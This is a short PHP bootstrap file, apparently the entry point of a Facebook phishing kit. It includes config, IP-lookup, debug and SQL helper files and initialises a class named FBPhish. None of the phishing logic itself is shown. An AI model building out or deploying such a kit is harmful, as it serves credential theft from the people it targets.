<?php
// Path to...
$apppath = dirname(__FILE__);

// Require...
require_once("$apppath/config.inc.php");
require_once("$apppath/functions/getip.func.php");
require_once("$apppath/functions/debug.func.php");
require_once("$apppath/classes/fbphish.class.php");
require_once("$apppath/classes/sql.class.php");

// Initialize
$FBPhish = new FBPhish();
$sql = new sql();

$FBPhish->init();